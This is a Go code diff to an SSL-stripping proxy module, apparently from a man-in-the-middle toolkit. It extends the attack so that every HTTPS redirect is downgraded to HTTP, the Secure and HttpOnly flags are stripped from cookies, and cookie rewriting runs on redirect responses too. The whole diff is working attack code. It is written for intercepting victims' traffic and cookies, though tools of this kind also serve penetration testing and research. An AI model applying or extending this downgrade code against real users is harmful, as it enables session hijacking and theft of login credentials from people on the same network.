@@ -159,11 +159,12 @@ func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redi
 	return
 }
 
-func (s *SSLStripper) fixCookies(res *http.Response) {
+func (s *SSLStripper) fixCookiesInHeader(res *http.Response) {
 	origHost := res.Request.URL.Hostname()
-	strippedHost := s.hosts.Strip(origHost)
+	strippedHost := s.hosts.Strip(origHost /* unstripped */)
 
-	if strippedHost != nil && strippedHost.Hostname != origHost && res.Header["Set-Cookie"] != nil {
+	if strippedHost != nil && /*strippedHost.Hostname != origHost && */res.Header["Set-Cookie"] != nil {
+		// origHost is being tracked.
 		// get domains from hostnames
 		if origParts, strippedParts := strings.Split(origHost, "."), strings.Split(strippedHost.Hostname, "."); len(origParts) > 1 && len(strippedParts) > 1 {
 			origDomain := origParts[len(origParts)-2] + "." + origParts[len(origParts)-1]
@@ -171,12 +172,13 @@ func (s *SSLStripper) fixCookies(res *http.Response) {
 
 			log.Info("[%s] Fixing cookies on %s", tui.Green("sslstrip"), tui.Bold(strippedHost.Hostname))
 			cookies := make([]string, len(res.Header["Set-Cookie"]))
-			// replace domain and strip "secure" flag for each cookie
+			// replace domain= and strip "secure" flag for each cookie
 			for i, cookie := range res.Header["Set-Cookie"] {
 				domainIndex := domainCookieParser.FindStringIndex(cookie)
 				if domainIndex != nil {
 					cookie = cookie[:domainIndex[0]] + strings.Replace(cookie[domainIndex[0]:domainIndex[1]], origDomain, strippedDomain, 1) + cookie[domainIndex[1]:]
 				}
+				cookie = strings.Replace(cookie, "https://", "http://", -1)
 				cookies[i] = flagsCookieParser.ReplaceAllString(cookie, "")
 			}
 			res.Header["Set-Cookie"] = cookies
@@ -222,18 +224,28 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 			newURL := location.String()
 
 			// are we getting redirected from http to https?
-			if orig.Scheme == "http" && location.Scheme == "https" {
+			// orig.Scheme is set to "https" during Process->REQUEST above. Can not check it.
+			// if orig.Scheme == "http" && location.Scheme == "https" {
+			if location.Scheme == "https" {
 
 				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))
 
 				// strip the URL down to an alternative HTTP version and save it to an ASCII Internationalized Domain Name
 				strippedURL := s.stripURL(newURL)
 				parsed, _ := url.Parse(strippedURL)
-				hostStripped := parsed.Hostname()
-				hostStripped, _ = idna.ToASCII(hostStripped)
-				s.hosts.Track(newHost, hostStripped)
+				if parsed.Port() == "443" || parsed.Port() == "" {
+					if parsed.Port() == "443" {
+						// Check for badly formatted "Location: https://domain.com:443/"
+						// Prevent stripping to "Location: http://domain.com:443/"
+						// and instead strip to "Location: http://domain.com/"
+						strippedURL = strings.Replace(strippedURL, ":443", "", 1)
+					}
+					hostStripped := parsed.Hostname()
+					hostStripped, _ = idna.ToASCII(hostStripped)
+					s.hosts.Track(newHost, hostStripped)
 
-				res.Header.Set("Location", strippedURL)
+					res.Header.Set("Location", strippedURL)
+				}
 			}
 		}
 	}
@@ -283,13 +295,14 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 
 		res.Header.Set("Content-Length", strconv.Itoa(len(body)))
 
-		// fix cookies domain + strip "secure" + "httponly" flags
-		s.fixCookies(res)
-
 		// reset the response body to the original unread state
 		// but with just a string reader, this way further calls
 		// to ioutil.ReadAll(res.Body) will just return the content
 		// we stripped without downloading anything again.
 		res.Body = ioutil.NopCloser(strings.NewReader(body))
 	}
+
+	// fix cookies domain + strip "secure" + "httponly" flags
+	// 302/Location redirect might set cookies as well. Always try to fix Cookies
+	s.fixCookiesInHeader(res)
 }
